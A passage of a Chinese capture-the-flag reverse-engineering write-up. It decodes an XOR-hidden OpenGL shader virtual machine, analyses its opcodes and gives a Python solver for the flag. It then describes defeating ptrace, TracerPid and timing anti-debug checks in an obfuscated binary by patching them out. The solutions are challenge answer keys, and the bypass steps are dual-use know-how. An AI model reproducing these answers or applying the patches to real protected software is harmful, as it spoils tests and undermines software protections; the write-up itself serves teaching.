+s = [0x75, 0x1B, 0x55, 0x0A, 0x17, 0x58, 0x21, 0x1A, 0x75, 0x6B, 0x5F, 0x67, 0x6B, 0x3B, 0x53, 0x34, 0x33, 0x0A, 0x0D, 0x01, 0x33, 0x66, 0x3F, 0x7D, 0x32, 0x40, 0x2C, 0x46, 0x22, 0x45, 0x7A, 0x0A, 0x3B, 0x5D, 0x5E, 0x33, 0x3E, 0x18, 0x45, 0x3D, 0x15, 0x6C, 0x23, 0x4D, 0x30, 0x7A, 0x2D, 0x5E, 0x53, 0x5D, 0x0D, 0x0F, 0x0D, 0x30, 0x29, 0x01, 0x0C, 0x66, 0x02, 0x05, 0x38, 0x27, 0x32, 0x13, 0x22, 0x04, 0x15, 0x0E, 0x68, 0x3B, 0x43, 0x17, 0x21, 0x1A, 0x6E, 0x2E, 0x07, 0x25, 0x44, 0x78, 0x3C, 0x25, 0x15, 0x21, 0x26, 0x29, 0x36, 0x1C, 0x27, 0x50, 0x6E, 0x5E, 0x20, 0x0A, 0x45, 0x07, 0x76, 0x15, 0x1B, 0x15, 0x71, 0x30, 0x26, 0x1B, 0x34, 0x1F, 0x19, 0x3B, 0x4B, 0x78, 0x29, 0x46, 0x7A, 0x76, 0x7A, 0x41, 0x05, 0x00, 0x0B, 0x15, 0x10, 0x66, 0x3D, 0x6E, 0x6B, 0x4E, 0x31, 0x30, 0x38, 0x45, 0x51, 0x18, 0x69, 0x3B, 0x75, 0x59, 0x73, 0x4B, 0x02, 0x34, 0x0D, 0x27, 0x3E, 0x76, 0x35, 0x4E, 0x4D, 0x77, 0x36, 0x29, 0x21, 0x7D, 0x33, 0x44, 0x4F, 0x60, 0x42, 0x67, 0x72, 0x5A, 0x25, 0x0E, 0x21, 0x40, 0x27, 0x5E, 0x11, 0x24, 0x30, 0x2C, 0x56, 0x7F, 0x02, 0x1E, 0x71, 0x5A, 0x25, 0x46, 0x66, 0x12, 0x7B, 0x66, 0x2D, 0x5B, 0x59, 0x4C, 0x37, 0x63, 0x58, 0x44, 0x0D, 0x34, 0x64, 0x4D, 0x5D, 0x16, 0x25, 0x5A, 0x66, 0x05, 0x30, 0x0F, 0x64, 0x73, 0x12, 0x6F, 0x50, 0x08, 0x5F, 0x4D, 0x58, 0x57, 0x6D, 0x36, 0x71, 0x45, 0x7A, 0x31, 0x5C, 0x36, 0x50, 0x7D, 0x32, 0x5A, 0x2E, 0x60, 0x00, 0x6F, 0x77, 0x30, 0x3C, 0x19, 0x67, 0x45, 0x5A, 0x6B, 0x57, 0x5C, 0x74, 0x59, 0x75, 0x5A, 0x7E, 0x50, 0x4D, 0x67, 0x53, 0x5D, 0x4B, 0x6A, 0x6E, 0x3C, 0x3D, 0x1F, 0x58, 0x29, 0x7A, 0x11, 0x2C, 0x0E, 0x2E, 0x75, 0x79, 0x48, 0x67, 0x58, 0x77, 0x78, 0x57, 0x6B, 0x48, 0x41, 0x6D, 0x03, 0x4A, 0x60, 0x61, 0x7F, 0x73, 0x58, 0x6A, 0x64, 0x44, 0x73, 0x6D, 0x76, 0x02, 0x2C, 0x20, 0x23, 0x11, 0x5B, 0x41, 0x20, 0x28, 0x12, 0x00, 0x32, 0x44, 0x12, 0x3A, 0x26, 0x6A, 0x3C, 0x7F, 0x4A, 0x60, 0x6B, 0x62, 0x65, 0x71, 0x6C, 0x59, 0x68, 0x51, 0x67, 0x67, 0x65, 0x59, 0x0D, 0x5C, 0x10, 0x7A, 0x4D, 0x35, 0x5D, 0x0B, 0x36, 0x17, 0x65, 0x0A, 0x39, 0x0B, 0x24, 0x1D, 0x58, 0x20, 0x08, 0x17, 0x45, 0x44, 0x1C, 0x73, 0x53, 0x21, 0x4E, 0x72, 0x77, 0x41, 0x5A, 0x30, 0x3D, 0x36, 0x00, 0x54, 0x02, 0x41, 0x6B, 0x6A, 0x12, 0x39, 0x03, 0x03, 0x28, 0x4A, 0x24, 0x6F, 0x6F, 0x5C, 0x10, 0x7A, 0x77, 0x44, 0x31, 0x37, 0x2B, 0x60, 0x4B, 0x53, 0x77, 0x5F, 0x78, 0x37, 0x08, 0x37, 0x51, 0x00, 0x47, 0x24, 0x1B, 0x7D, 0x5D, 0x73, 0x4E, 0x6E, 0x4A, 0x24, 0x08, 0x31, 0x53, 0x74, 0x20, 0x44, 0x52, 0x6D, 0x57, 0x7A, 0x5B, 0x71, 0x3E, 0x48, 0x7D, 0x6D, 0x43, 0x06, 0x64, 0x66, 0x12, 0x55, 0x4B, 0x67, 0x1F, 0x7A, 0x76, 0x7C, 0x4A, 0x34, 0x7E, 0x59, 0x52, 0x48, 0x68, 0x75, 0x4A, 0x6A, 0x3D, 0x33, 0x45, 0x23, 0x07, 0x3A, 0x4C, 0x23, 0x00, 0x2A, 0x19, 0x40, 0x75, 0x76, 0x77, 0x58, 0x77, 0x76, 0x4B, 0x11, 0x3F, 0x39, 0x2C, 0x18, 0x59, 0x39, 0x19, 0x18, 0x55, 0x55, 0x1F, 0x7E, 0x54, 0x7E, 0x78, 0x5E, 0x79, 0x51, 0x11, 0x5A, 0x70, 0x3E, 0x0D, 0x17, 0x07, 0x7E, 0x2F, 0x4C, 0x7E, 0x73, 0x1A, 0x2B, 0x09, 0x64, 0x44, 0x6A, 0x57, 0x66, 0x1E, 0x11, 0x77, 0x78, 0x5B, 0x18, 0x71, 0x49, 0x64, 0x24, 0x41, 0x7F, 0x76, 0x2F, 0x12, 0x3A, 0x65, 0x50, 0x51, 0x4A, 0x66, 0x6A, 0x53, 0x51, 0x68, 0x54, 0x40, 0x7E, 0x6A, 0x4C, 0x13, 0x76, 0x4D, 0x58, 0x4B, 0x73, 0x11, 0x69, 0x58, 0x74, 0x4E, 0x6E, 0x3C, 0x0D, 0x32, 0x58, 0x75, 0x6B, 0x79, 0x44, 0x66, 0x4E, 0x66, 0x68, 0x5D, 0x65, 0x4B, 0x4E, 0x74, 0x25, 0x0A, 0x42, 0x5D, 0x7E, 0x2E, 0x54, 0x4A, 0x79, 0x20, 0x2F, 0x17, 0x67, 0x43, 0x08, 0x74, 0x52, 0x74, 0x72, 0x7C, 0x74, 0x66, 0x73, 0x48, 0x4F, 0x4C, 0x02, 0x54, 0x49, 0x66, 0x38, 0x2B, 0x35, 0x5C, 0x6A, 0x68, 0x78, 0x5D, 0x1C, 0x11, 0x62, 0x1F, 0x65, 0x50, 0x7A, 0x47, 0x44, 0x2D, 0x4C, 0x3E, 0x63, 0x7A, 0x5C, 0x4E, 0x50, 0x77, 0x75, 0x66, 0x72, 0x75, 0x72, 0x00, 0x1D, 0x12, 0x4A, 0x23, 0x3D, 0x0E, 0x7F, 0x46, 0x64, 0x1B, 0x65, 0x10, 0x1A, 0x69, 0x63, 0x76, 0x54, 0x77, 0x4B, 0x12, 0x39, 0x16, 0x25, 0x02, 0x6E, 0x08, 0x77, 0x6D, 0x6E, 0x04, 0x07, 0x25, 0x78, 0x41, 0x62, 0x1C, 0x58, 0x7B, 0x76, 0x5C, 0x1B, 0x47, 0x7F, 0x1B, 0x62, 0x53, 0x33, 0x4C, 0x7B, 0x73, 0x14, 0x23, 0x13, 0x41, 0x7D, 0x5D, 0x56, 0x47, 0x61, 0x66, 0x60, 0x56, 0x6A, 0x6E, 0x10, 0x79, 0x68, 0x75, 0x76, 0x15, 0x7A, 0x68, 0x50, 0x63, 0x77, 0x66, 0x79, 0x5A, 0x75, 0x09, 0x07, 0x2E, 0x4D, 0x46, 0x6B, 0x46, 0x69, 0x5A, 0x6D, 0x41, 0x51, 0x78, 0x54, 0x54, 0x48, 0x66, 0x26, 0x39, 0x21, 0x03, 0x58, 0x30, 0x76, 0x1A, 0x7A, 0x1D, 0x28, 0x24, 0x63, 0x51, 0x64, 0x40, 0x7E, 0x7A, 0x42, 0x76, 0x46, 0x43, 0x7C, 0x19, 0x48, 0x73, 0x30, 0x76, 0x77, 0x51, 0x27, 0x0B, 0x07, 0x61, 0x65, 0x67, 0x5E, 0x79, 0x78, 0x76, 0x52, 0x1B, 0x51, 0x6F, 0x73, 0x5F, 0x43, 0x33, 0x42, 0x19, 0x7A, 0x64, 0x48, 0x6C, 0x76, 0x4A, 0x6A, 0x6B, 0x76, 0x76, 0x66, 0x2C, 0x4F, 0x3F, 0x6E, 0x73, 0x72, 0x76, 0x50, 0x1F, 0x76, 0x47, 0x50, 0x77, 0x7D, 0x04, 0x44, 0x7C, 0x43, 0x75, 0x4A, 0x63, 0x59, 0x5D, 0x05, 0x7A, 0x5C, 0x1B, 0x1B, 0x1E, 0x00, 0x4C, 0x37, 0x12, 0x33, 0x2A, 0x7A, 0x7E, 0x41, 0x01, 0x4C, 0x78, 0x75, 0x12, 0x54, 0x1D, 0x04, 0x35, 0x78, 0x54, 0x20, 0x3F, 0x05, 0x20, 0x07, 0x74, 0x7B, 0x74, 0x20, 0x55, 0x39, 0x65, 0x4C, 0x76, 0x60, 0x70, 0x62, 0x45, 0x05, 0x7B, 0x42, 0x60, 0x61, 0x4A, 0x78, 0x02, 0x5D, 0x54, 0x5E, 0x12, 0x66, 0x77, 0x73, 0x18, 0x2B, 0x09, 0x60, 0x4D, 0x27, 0x17, 0x74, 0x68, 0x44, 0x08, 0x21, 0x6E, 0x1C, 0x03, 0x30, 0x3F, 0x2B, 0x38, 0x22, 0x19, 0x51, 0x64, 0x2E, 0x4B, 0x58, 0x44, 0x75, 0x44, 0x19, 0x3F, 0x2C, 0x0F, 0x69, 0x5D, 0x68, 0x78, 0x62, 0x68, 0x75, 0x0C, 0x26, 0x20, 0x37, 0x45, 0x76, 0x07, 0x35, 0x18, 0x27, 0x06, 0x72, 0x0C, 0x6A, 0x20, 0x05, 0x3E, 0x02, 0x32, 0x78, 0x13, 0x11, 0x7D, 0x70, 0x21, 0x63, 0x54, 0x2C, 0x08, 0x1E, 0x01, 0x5F, 0x3B, 0x6E, 0x54, 0x75, 0x78, 0x1A, 0x32, 0x02, 0x03, 0x50, 0x24, 0x23, 0x1A, 0x44, 0x52, 0x76, 0x33, 0x1A, 0x75, 0x7E, 0x4C, 0x7E, 0x44, 0x63, 0x57, 0x50, 0x73, 0x76, 0x12, 0x11, 0x67, 0x30, 0x07, 0x5E, 0x39, 0x11, 0x64, 0x26, 0x04, 0x35, 0x24, 0x3C, 0x12, 0x79, 0x6A, 0x58, 0x0F, 0x0B, 0x3F, 0x35, 0x16, 0x49, 0x30, 0x01, 0x0A, 0x65, 0x6E, 0x32, 0x5A, 0x3B, 0x08, 0x58, 0x41, 0x73, 0x01, 0x67, 0x49, 0x78, 0x4E, 0x3A, 0x2D, 0x14, 0x68, 0x08, 0x78, 0x70, 0x77, 0x00, 0x33, 0x13, 0x68, 0x23, 0x5A, 0x7C, 0x50, 0x6E, 0x74, 0x6D, 0x4B, 0x11, 0x41, 0x23, 0x31, 0x5A, 0x18, 0x79, 0x7C, 0x77, 0x54, 0x64, 0x45, 0x09, 0x7A, 0x4D, 0x78, 0x20, 0x2D, 0x2E, 0x3F, 0x35, 0x5A, 0x69, 0x4C, 0x44, 0x54, 0x44, 0x32, 0x3B, 0x38, 0x76, 0x44, 0x7F, 0x79, 0x04, 0x02, 0x44, 0x19, 0x20, 0x50, 0x31, 0x10, 0x32, 0x05, 0x17, 0x70, 0x4A, 0x22, 0x2F, 0x31, 0x24, 0x0B, 0x15, 0x77, 0x78, 0x66, 0x62, 0x7B, 0x67, 0x44, 0x54, 0x40, 0x42, 0x70, 0x60, 0x4A, 0x79, 0x5B, 0x75, 0x1E, 0x75, 0x01, 0x09, 0x79, 0x7F, 0x68, 0x4D, 0x7E, 0x5A, 0x38, 0x71, 0x57, 0x76, 0x4A, 0x32, 0x14, 0x21, 0x68, 0x37, 0x52, 0x48, 0x7B, 0x6A, 0x1B, 0x33, 0x46, 0x01, 0x38, 0x6D, 0x67, 0x3F, 0x57, 0x76, 0x12, 0x6E, 0x15, 0x39, 0x03, 0x37, 0x27, 0x42, 0x20, 0x02, 0x16, 0x24, 0x18, 0x1D, 0x19, 0x2E, 0x3F, 0x71, 0x45, 0x7A, 0x74, 0x17, 0x60, 0x59, 0x5F, 0x76, 0x15, 0x7A, 0x68, 0x16, 0x2F, 0x38, 0x27, 0x2D, 0x5A, 0x34, 0x00, 0x18, 0x36, 0x0C, 0x1F, 0x2F, 0x0C, 0x3C, 0x5A, 0x7B, 0x41, 0x52, 0x66, 0x4A, 0x44, 0x59, 0x4C, 0x6E, 0x78, 0x72, 0x4B, 0x16, 0x35, 0x39, 0x50, 0x2E, 0x4B, 0x3E, 0x37, 0x34, 0x1C, 0x31, 0x4E, 0x73, 0x76, 0x16, 0x2E, 0x05, 0x16, 0x75, 0x1A, 0x44, 0x62, 0x78, 0x63, 0x61, 0x7B, 0x5B, 0x4E, 0x44, 0x73, 0x6D, 0x22, 0x05, 0x3F, 0x7A, 0x2E, 0x43, 0x1E, 0x5C, 0x66, 0x29, 0x1A, 0x0D, 0x6E, 0x18, 0x14, 0x25, 0x66, 0x3B, 0x6C, 0x7C, 0x4A, 0x2C, 0x39, 0x33, 0x27, 0x33, 0x3C, 0x0F, 0x25, 0x1D, 0x73, 0x79, 0x76, 0x03, 0x46, 0x33, 0x08, 0x14, 0x6E, 0x73, 0x1E, 0x44, 0x36, 0x0E, 0x35, 0x08, 0x3F, 0x16, 0x22, 0x1C, 0x15, 0x6D, 0x67, 0x54, 0x57, 0x44, 0x4C, 0x2E, 0x06, 0x2C, 0x6A, 0x2B, 0x77, 0x4A, 0x47, 0x66, 0x2B, 0x3C, 0x5C, 0x5C, 0x1F, 0x14, 0x20, 0x64, 0x0C, 0x75, 0x46, 0x4C, 0x3C, 0x10, 0x31, 0x37, 0x21, 0x33, 0x5E, 0x39, 0x2E, 0x44, 0x6D, 0x72, 0x79, 0x7C, 0x5E, 0x15, 0x7C, 0x42, 0x2B, 0x21, 0x1F, 0x33, 0x56, 0x5D, 0x4F, 0x7B, 0x12, 0x6E, 0x36, 0x3E, 0x1E, 0x22, 0x03, 0x26, 0x18, 0x36, 0x04, 0x74, 0x7F, 0x44, 0x5F, 0x63, 0x04, 0x73, 0x4A, 0x5B, 0x52, 0x48, 0x77, 0x6D, 0x4B, 0x43, 0x2F, 0x35, 0x01, 0x58, 0x08, 0x3A, 0x5D, 0x25, 0x24, 0x67, 0x4A, 0x6F, 0x77, 0x14, 0x3D, 0x21, 0x7B, 0x7D, 0x5A, 0x64, 0x77, 0x7A, 0x11, 0x66, 0x5B, 0x60, 0x40, 0x6E, 0x59, 0x7C, 0x08, 0x63, 0x6E, 0x5C, 0x77, 0x58, 0x77, 0x76, 0x1D, 0x54, 0x31, 0x63, 0x74, 0x53, 0x52, 0x3A, 0x02, 0x42, 0x4A, 0x44, 0x0C, 0x6E, 0x02, 0x30, 0x3B, 0x5F, 0x7F, 0x51, 0x1F, 0x44, 0x7C, 0x76, 0x5C, 0x4A, 0x58, 0x7A, 0x66, 0x5D, 0x7B, 0x63, 0x45, 0x75, 0x60, 0x76, 0x4C, 0x7A, 0x59, 0x20, 0x57, 0x52, 0x74, 0x76, 0x08, 0x5E, 0x34, 0x0A, 0x36, 0x71, 0x41, 0x6F, 0x76, 0x2F, 0x12, 0x3A, 0x64, 0x50, 0x50, 0x4A, 0x66, 0x6A, 0x53, 0x51, 0x68, 0x52, 0x45, 0x77, 0x76, 0x68, 0x07, 0x7F, 0x56, 0x72, 0x4B, 0x73, 0x11, 0x69, 0x0E, 0x31, 0x0D, 0x7D, 0x78, 0x01, 0x29, 0x1C, 0x37, 0x28, 0x63, 0x54, 0x7B, 0x45, 0x30, 0x3F, 0x10, 0x66, 0x43, 0x54, 0x7A, 0x7B, 0x47, 0x11, 0x04, 0x78, 0x77, 0x58, 0x41, 0x69, 0x78, 0x7C, 0x5D, 0x6E, 0x61, 0x33, 0x7A, 0x42, 0x78, 0x72, 0x3A, 0x3F, 0x35, 0x69, 0x41, 0x0F, 0x0D, 0x1D, 0x11, 0x16, 0x77, 0x6E, 0x73, 0x76, 0x03, 0x2B, 0x21, 0x7E, 0x0E, 0x5F, 0x5D, 0x3D, 0x43, 0x64, 0x55, 0x73, 0x08, 0x0B, 0x34, 0x0D, 0x34, 0x78, 0x7A, 0x76, 0x3D, 0x58, 0x7A, 0x65, 0x68, 0x61, 0x79, 0x72, 0x5D, 0x5A, 0x58, 0x4E, 0x67, 0x7A, 0x0E, 0x22, 0x1D, 0x75, 0x1F, 0x75, 0x62, 0x5E, 0x3D, 0x79, 0x2A, 0x05, 0x33, 0x08, 0x53, 0x3F, 0x04, 0x7E, 0x47, 0x73, 0x4F, 0x67, 0x6F, 0x67, 0x5B, 0x4C, 0x3E, 0x63, 0x40, 0x69, 0x38, 0x48, 0x77, 0x76, 0x4D, 0x43, 0x12, 0x35, 0x01, 0x6E, 0x1F, 0x34, 0x15, 0x33, 0x21, 0x50, 0x66, 0x4D, 0x53, 0x38, 0x04, 0x00, 0x5F, 0x2E, 0x29, 0x3D, 0x17, 0x28, 0x74, 0x15, 0x75, 0x01, 0x3A, 0x3A, 0x5A, 0x28, 0x7C, 0x5C, 0x63, 0x04, 0x6E, 0x74, 0x4A, 0x7B, 0x5E, 0x44, 0x7A, 0x55, 0x45, 0x68, 0x44, 0x79, 0x52, 0x32, 0x14, 0x15, 0x76, 0x4E, 0x54, 0x30, 0x29, 0x3A, 0x70, 0x20, 0x0A, 0x14, 0x30, 0x37, 0x5F, 0x29, 0x43, 0x60, 0x72, 0x7F, 0x49, 0x7C, 0x47, 0x67, 0x78, 0x1A, 0x6E, 0x41, 0x48, 0x5F, 0x10, 0x44, 0x73, 0x76, 0x20, 0x3F, 0x12, 0x62, 0x4E, 0x02, 0x3A, 0x23, 0x37, 0x1C, 0x0A, 0x3B, 0x3A, 0x0C, 0x47, 0x41, 0x7B, 0x7A, 0x1E, 0x0A, 0x3E, 0x44, 0x0D, 0x32, 0x31, 0x27, 0x3E, 0x67, 0x46, 0x6A, 0x27, 0x37, 0x2F, 0x23, 0x2B, 0x53, 0x6A, 0x44, 0x00, 0x7A, 0x66, 0x5E, 0x03, 0x7A, 0x4D, 0x5D, 0x77, 0x7D, 0x02, 0x48, 0x77, 0x17, 0x30, 0x12, 0x78, 0x1B, 0x7E, 0x51, 0x4B, 0x5C, 0x67, 0x54, 0x57, 0x44, 0x4C, 0x3C, 0x01, 0x3B, 0x23, 0x11, 0x38, 0x0D, 0x15, 0x34, 0x78, 0x68, 0x12, 0x02, 0x0E, 0x02, 0x62, 0x62, 0x12, 0x3C, 0x02, 0x0D, 0x36, 0x21, 0x3B, 0x2A, 0x3B, 0x24, 0x1C, 0x7A, 0x66, 0x4A, 0x77, 0x7B, 0x73, 0x58, 0x16, 0x3F, 0x00]
+s[0] ^= 0x56
+xor = b"Vm0xd1NtUXlWa1pPVldoVFlUSlNjVlZyV21GVk1XeDBaRVYwYWxadVFsaFdiWFF3VmxkS1IxTnNXbFpXZWtFeFZsUkdTMk15VGtaYVJtUk9ZbXRLZVZacldtdFNNVnBYVm01R1UySkdXbFJVVnpWUFRURmtjbGRzWkU5U01IQXdWa2QwVjFaWFNrbFJiR2hWVm5wV2NsUlVSbFpsUmxwMFQxZG9UbUV5ZHpCWFYzUmhZekZhYzFacVdtbFNXRkpYV1ZkMGQyUnNVbGhsU0dSVVZqQndSMVpITVc5aFZscFlaSHBLVjJKVVFYaFdSRVp6VmpGS1dWcEdVbWxpVmtwdlZsZDRWazFXU2tkaVJtUllZbTFTV0ZWdGRHRk5WbXQzV2toT2FWSnNjRmRaTUdoM1ZqQXhWMk5JV2xkU1JVVjRWbXBHUjJOV1VuTlNiR1JUVWxWVk1RPT0="
+for i in range(1, 1760):
+    s[i] ^= xor[i%460]
+print("".join(map(chr, s)))
+```
+
+解得GL虚拟机实现代码：
+
+```OpenGL
+#version 430 core
+
+layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;
+layout(std430, binding = 0) buffer OpCodes  { int opcodes[]; };
+layout(std430, binding = 2) buffer CoConsts { int co_consts[]; };
+layout(std430, binding = 3) buffer Cipher   { int cipher[16]; };
+layout(std430, binding = 4) buffer Stack    { int stack_data[256]; };
+layout(std430, binding = 5) buffer Out      { int verdict;         };
+
+const int MaxInstructionCount = 1000;
+
+void main()
+{
+    if (gl_GlobalInvocationID.x > 0) return;
+
+    uint ip = 0u;
+    int sp = 0;
+    verdict = -233;
+
+    while (ip < uint(MaxInstructionCount))
+    {
+        int opcode = opcodes[int(ip)];
+        int arg    = opcodes[int(ip)+1];
+
+        switch (opcode)
+        {
+            case 2:
+                stack_data[sp++] = co_consts[arg];
+                break;
+            case 7:
+            {
+                int b = stack_data[--sp];
+                int a = stack_data[--sp];
+                stack_data[sp++] = a + b;
+                break;
+            }
+            case 8:
+            {
+                int a = stack_data[--sp];
+                int b = stack_data[--sp];
+                stack_data[sp++] = a - b;
+                break;
+            }
+            case 14:
+            {
+                int b = stack_data[--sp];
+                int a = stack_data[--sp];
+                stack_data[sp++] = a ^ b;
+                break;
+            }
+
+            case 15:
+            {
+                int b = stack_data[--sp];
+                int a = stack_data[--sp];
+                stack_data[sp++] = int(a == b);
+                break;
+            }
+
+            case 16:
+            {
+                bool ok = true;
+                for (int i = 0; i < 16; i++)
+                {
+                    if (stack_data[i] != (cipher[i] - 20))
+                    { 
+                        ok = false; 
+                        break; 
+                    }
+                }
+                verdict = ok ? 1 : -1;
+                return;
+            }
+
+            case 18:
+            {
+                int c = stack_data[--sp];
+                if (c == 0) ip = uint(arg);
+                break;
+            }
+
+            default:
+                verdict = 500;
+                return;
+        }
+
+        ip+=2;
+    }
+    verdict = 501;
+}
+l 
+#version 330
+
+#define S(a,b,t) smoothstep(a,b,t)
+
+uniform float time;
+
+out vec4 fragColor;
+
+mat2 Rot(float a) {
+    float s = sin(a);
+    float c = cos(a);
+    return mat2(c, -s, s, c);
+}
+
+vec2 hash(vec2 p) {
+    p = vec2(dot(p, vec2(2127.1, 81.17)), dot(p, vec2(1269.5, 283.37)));
+    return fract(sin(p) * 43758.5453);
+}
+
+float noise(vec2 p) {
+    vec2 i = floor(p);
+    vec2 f = fract(p);
+    vec2 u = f * f * (3.0 - 2.0 * f);
+
+    return mix(
+        mix(dot(-1.0 + 2.0 * hash(i + vec2(0.0, 0.0)), f - vec2(0.0, 0.0)),
+            dot(-1.0 + 2.0 * hash(i + vec2(1.0, 0.0)), f - vec2(1.0, 0.0)), u.x),
+        mix(dot(-1.0 + 2.0 * hash(i + vec2(0.0, 1.0)), f - vec2(0.0, 1.0)),
+            dot(-1.0 + 2.0 * hash(i + vec2(1.0, 1.0)), f - vec2(1.0, 1.0)), u.x),
+        u.y
+    ) * 0.5 + 0.5;
+}
+
+void main() {
+    vec2 uSize = vec2(1280.0, 800.0);
+    vec2 uv = gl_FragCoord.xy / uSize;
+
+    float ratio = uSize.x / uSize.y;
+    vec2 tuv = uv - 0.5;
+
+    float degree = noise(vec2(time * 0.1, tuv.x * tuv.y));
+    tuv.y *= 1.0 / ratio;
+    tuv *= Rot(radians((degree - 0.5) * 720.0 + 180.0));
+    tuv.y *= ratio;
+
+    float frequency = 3.5;
+    float amplitude = 10.0;
+    float speed = time * 1.5;
+
+    tuv.x += sin(tuv.y * frequency + speed) / amplitude;
+    tuv.y += sin(tuv.x * frequency * 1.5 + speed) / (amplitude * 0.5);
+
+    vec3 color1 = vec3(0.8, 0.4, 0.9);
+    vec3 color2 = vec3(0.4, 0.7, 1.0);
+    vec3 color3 = vec3(1.0, 0.6, 0.4);
+    vec3 color4 = vec3(0.6, 1.0, 0.6);
+
+    vec3 layer1 = mix(color1, color2, S(-0.3, 0.2, (tuv * Rot(radians(-5.0))).x));
+    vec3 layer2 = mix(color3, color4, S(-0.3, 0.2, (tuv * Rot(radians(-5.0))).x));
+    vec3 finalColor = mix(layer1, layer2, S(0.5, -0.3, tuv.y));
+
+    fragColor = vec4(finalColor, 1.0);
+}
+```
+
+分析虚拟机的字节码的作用如下：
+
+2, x → PUSH co_consts[x]
+
+7, 0 → ADD
+
+8, 0 → SUB
+
+14, 0 → XOR
+
+15 ,x→CMP_EQ (y == x)
+
+16 → CHECK（对前16个栈值与 cipher-20 比较）
+
+18，addr→ JMP_IF_ZERO addr
+
+由开头的layout可以对应到源程序里的初始化区域
+
+![img](60c3e82d-beab-42dd-9013-49cd331d2be9.png)
+
+向上继续溯源可以找到真正初始化数据的位置
+
+![img](c791a1be-391d-4aee-b9f9-cf64a21a4e07.png)
+
+提出来所有的opcodes，如下：
+
+```OpenGL
+2,0,
+2,1,2,0,14,0,2,16,8,0,
+2,2,2,1,14,0,2,17,8,0,
+2,3,2,2,14,0,2,18,7,0,
+2,4,2,3,14,0,2,19,7,0,
+2,5,2,4,14,0,2,20,8,0,
+2,6,2,5,14,0,2,21,7,0,
+2,7,2,6,14,0,2,22,7,0,
+2,8,2,7,14,0,2,23,7,0,
+2,9,2,8,14,0,2,24,7,0,
+2,10,2,9,14,0,2,25,7,0,
+2,11,2,10,14,0,2,26,7,0,
+2,12,2,11,14,0,2,27,8,0,
+2,13,2,12,14,0,2,28,8,0,
+2,14,2,13,14,0,2,29,7,0,
+2,15,2,14,14,0,2,30,8,0,
+16,0,
+2,16,2,17,15,0,18,84,
+2,31,1,0,3,1
+```
+
+解析一下每一组的操作
+
+2,0,        //PUSH co_consts[0]
+
+2,1,        // PUSH co_consts[1]
+
+14,0,       // XOR 
+
+2,16,       // PUSH co_consts[16]
+
+8,0         //  SUB  
+
+最后的比较是和cipher[i]-20进行比较
+
+ 最后可以写出exp如下：
+
+```Python
+CIPHER = [0xF3, 0x82, 0x06, 0x1FD, 0x150, 0x38, 0xB2, 0xDE, 0x15A, 0x197, 0x9C, 0x1D7, 0x6E, 0x28, 0x146,
+          0x97]
+CONSTS = [0xB0, 0xC8, 0xFA, 0x86, 0x6E, 0x8F, 0xAF, 0xBF, 0xC9, 0x64, 0xD7, 0xC3, 0xE3, 0xEF, 0x87, 0x00]
+op_pattern = [1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1]
+
+targets = [c - 20 for c in CIPHER]
+inputs = [0] * 16
+
+inputs[0] = targets[0]
+
+for i in range(1, 16):
+    prev_input = inputs[i - 1]
+    target = targets[i]
+    const = CONSTS[i - 1]
+    op_type = op_pattern[i - 1]
+
+    if op_type == 0:  # ADD
+        intermediate = (target - const)&0xff
+    elif op_type == 1:  # SUB
+        intermediate = (const - target)&0xff
+
+    inputs[i] = intermediate ^ prev_input
+
+print(bytes(inputs).hex())
+```
+
+## obfuscate
+
+ida反编译错误，main有爆红，不用管直接分析其他函数，分别找到如下函数
+
+首先是3处反调试
+
+1. ptrace
+
+```C
+__int64 sub_7E20()
+{
+  __int64 result; // rax
+
+  result = ptrace(PTRACE_TRACEME, 0LL, 0LL);
+  if ( result == -1 )
+    _exit(1);
+  return result;
+}
+```
+
+1. 读取文件Tracerid值（动调跟进解密后的字符串可以看到Tracerid）
+
+```C
+__int64 __fastcall sub_7EC0(char *a1)
+{
+  char s[140]; // [rsp+10h] [rbp-D0h] BYREF
+  unsigned int v3; // [rsp+9Ch] [rbp-44h] BYREF
+  FILE *stream; // [rsp+A0h] [rbp-40h]
+  char *needle; // [rsp+A8h] [rbp-38h]
+  int v7; // [rsp+B4h] [rbp-2Ch] BYREF
+  char filename[18]; // [rsp+BAh] [rbp-26h] BYREF
+  int v9; // [rsp+CCh] [rbp-14h] BYREF
+  char modes[2]; // [rsp+D2h] [rbp-Eh] BYREF
+  int v11; // [rsp+D4h] [rbp-Ch] BYREF
+  int v12; // [rsp+DAh] [rbp-6h] BYREF
+  __int16 v13; // [rsp+DEh] [rbp-2h]
+
+  v12 = 1053795514;
+  v13 = -10245;
+  v11 = 468703135;
+  xor_dec(&v12, &v11, 6LL, 4LL);
+  *modes = 29201;
+  v9 = 233665123;
+  xor_dec(modes, &v9, 2LL, 4LL);
+  qmemcpy(filename, "uU \\9\n!V6C}@.D&F)%", sizeof(filename));
+  v7 = 861021530;
+  xor_dec(filename, &v7, 18LL, 4LL);
+  needle = a1;
+  stream = fopen(filename, modes);
+  if ( stream )
+  {
+    v3 = -1;
+    while ( fgets(s, 128, stream) && (!__isoc99_sscanf(s, &v12, s, &v3) || !strstr(s, needle)) )
+      ;
+    fclose(stream);
+    return v3;
+  }
+  else
+  {
+    return -1;
+  }
+}
+```
+
+1. getpid
+
+```C++
+unsigned __int64 sub_8030()
+{
+  unsigned __int64 v0; // rax
+  unsigned __int64 v1; // rax
+  unsigned __int64 result; // rax
+  __int64 v3; // [rsp+8h] [rbp-8h]
+
+  v0 = __rdtsc();
+  v3 = v0;
+  getpid();
+  v1 = __rdtsc();
+  result = v1 - v3;
+  if ( result > 0x186A0 )
+    _exit(1);
+  return result;
+}
+```
+
+一个个force jmp或者nop后patch即可动调
+
+比较函数
+
+```C++
+int __fastcall sub_6180(__int64 a1)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  *(_QWORD *)format = 0x61C477DB26D672BDLL;
+  v11 = 0x41BD3F9C2FD86CACLL;
+  v9 = 1102520059;
+  xor_dec(format, &v9, 16LL, 4LL);
+  memcpy(dest, &unk_9031, sizeof(dest));
+  v7 = 1350490027;
+  xor_dec(dest, &v7, 38LL, 4LL);
+  memcpy(src, &cmp, 0x21uLL);
+  v5 = 1189641421;
+  xor_dec(src, &v5, 33LL, 4LL);
+  v4 = a1;
+  memcpy(v3, src, 0x21uLL);
+  for ( i = 0; i < 32; ++i )
+  {
+    if ( *(unsigned __int8 *)(v4 + i) != (unsigned __int8)v3[i] )
+    {
+      printf(format);
+      exit(1);
+    }
+  }
+  return printf(dest);
+}
+```
+
